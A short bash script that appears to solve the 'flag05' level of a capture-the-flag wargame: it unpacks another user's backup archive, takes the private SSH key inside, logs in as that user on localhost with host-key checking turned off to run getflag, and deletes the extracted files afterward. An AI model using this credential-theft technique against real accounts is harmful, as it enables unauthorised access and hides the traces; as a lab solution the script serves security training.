#!/usr/bin/env bash

rm -f -r /tmp/flag05
mkdir -p /tmp/flag05

tar -C /tmp/flag05 -f /home/flag05/.backup/*.tgz -x -z

ssh -i /tmp/flag05/.ssh/id_ed25519 -l flag05 \
    -o StrictHostKeyChecking=no 127.0.0.1 getflag

rm -f -r /tmp/flag05
